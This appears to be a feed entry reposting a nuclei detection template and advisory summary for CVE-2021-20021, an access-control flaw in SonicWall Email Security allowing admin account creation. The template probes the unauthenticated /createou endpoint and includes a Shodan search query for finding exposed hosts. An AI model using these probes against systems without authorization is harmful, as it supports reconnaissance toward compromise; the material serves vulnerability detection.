    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> SonicWall Email Security 权限控制漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2021-20021</li></ul><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> SonicWall Email Security 10.0.9.x版本中存在权限控制漏洞，攻击者可以通过发送特制的HTTP请求到远程主机来创建管理员账户。</p><p><strong>产品厂商：</strong> SonicWall</p><p><strong>产品名称：</strong> Email Security</p><p><strong>影响版本：</strong> 10.0.9.x</p><p><strong>搜索语法：</strong> SonicWall Email Security</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/1e39789f2753a382e8f369c51c80c4db72e1c7f9/http%2Fcves%2F2021%2FCVE-2021-20021.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/1e39789f2753a382e8f369c51c80c4db72e1c7f9/http%2Fcves%2F2021%2FCVE-2021-20021.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVE-2021-20021</span><br><br><span class="hljs-attribute">info</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">SonicWall Email Security - Broken Access Control</span><br>  <span class="hljs-attribute">author</span><span class="hljs-punctuation">:</span> <span class="hljs-string">mavrickrishi</span><br>  <span class="hljs-attribute">severity</span><span class="hljs-punctuation">:</span> <span class="hljs-string">critical</span><br>  <span class="hljs-attribute">description</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>    <span class="hljs-attribute">A vulnerability in the SonicWall Email Security version 10.0.9.x allows an attacker to create an administrative account by sending a crafted HTTP request to the remote host.</span><br><span class="hljs-attribute">  reference</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://nvd.nist.gov/vuln/detail/CVE-2021-20021</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://www.sonicwall.com/support/product-notification/security-notice-sonicwall-email-security-zero-day-vulnerabilities/210416112932360/</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploits-in-sonicwall-email-security-lead-to-compromise</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://www.cisa.gov/known-exploited-vulnerabilities-catalog</span><br>  <span class="hljs-attribute">remediation</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>    <span class="hljs-attribute">Update to the latest version of SonicWall Email Security or apply security patches provided by SonicWall.</span><br><span class="hljs-attribute">  classification</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">cvss-metrics</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</span><br>    <span class="hljs-attribute">cvss-score</span><span class="hljs-punctuation">:</span> <span class="hljs-string">9.8</span><br>    <span class="hljs-attribute">cve-id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVE-2021-20021</span><br>    <span class="hljs-attribute">cwe-id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CWE-269</span><br>    <span class="hljs-attribute">epss-score</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.97359</span><br>    <span class="hljs-attribute">epss-percentile</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.99972</span><br>    <span class="hljs-attribute">cpe</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cpe:2.3:a:sonicwall:email_security:*:*:*:*:*:*:*:*</span><br>  <span class="hljs-attribute">metadata</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">verified</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br>    <span class="hljs-attribute">max-request</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2</span><br>    <span class="hljs-attribute">vendor</span><span class="hljs-punctuation">:</span> <span class="hljs-string">sonicwall</span><br>    <span class="hljs-attribute">product</span><span class="hljs-punctuation">:</span> <span class="hljs-string">email_security</span><br>    <span class="hljs-attribute">shodan-query</span><span class="hljs-punctuation">:</span> <span class="hljs-string">SonicWall Email Security</span><br>  <span class="hljs-attribute">tags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cve,cve2021,sonicwall,unauth,kev</span><br><br><span class="hljs-attribute">flow</span><span class="hljs-punctuation">:</span> <span class="hljs-string">http(1) || http(2)</span><br><br><span class="hljs-attribute">http</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">method: GET</span><br>    <span class="hljs-attribute">path</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/createou?data=test123&quot;</span><br><br>    <span class="hljs-attribute">matchers-condition</span><span class="hljs-punctuation">:</span> <span class="hljs-string">and</span><br>    <span class="hljs-attribute">matchers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: word</span><br>        <span class="hljs-attribute">words</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">Error in parsing request</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: status</span><br>        <span class="hljs-attribute">status</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">400</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">500</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: word</span><br>        <span class="hljs-attribute">part</span><span class="hljs-punctuation">:</span> <span class="hljs-string">response</span><br>        <span class="hljs-attribute">words</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">SonicWall</span><br><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">method: POST</span><br>    <span class="hljs-attribute">path</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/createou&quot;</span><br>    <span class="hljs-attribute">headers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/x-www-form-urlencoded</span><br><br>    <span class="hljs-attribute">body</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>      <span class="hljs-attribute">data=&lt;xml&gt;test&lt;/xml&gt;</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">    matchers-condition</span><span class="hljs-punctuation">:</span> <span class="hljs-string">and</span><br>    <span class="hljs-attribute">matchers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: word</span><br>        <span class="hljs-attribute">words</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">Error in parsing request</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: status</span><br>        <span class="hljs-attribute">status</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">400</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">500</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: word</span><br>        <span class="hljs-attribute">part</span><span class="hljs-punctuation">:</span> <span class="hljs-string">response</span><br>        <span class="hljs-attribute">words</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">SonicWall</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; SonicWall Email Security 权限控制漏洞&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
</feed>
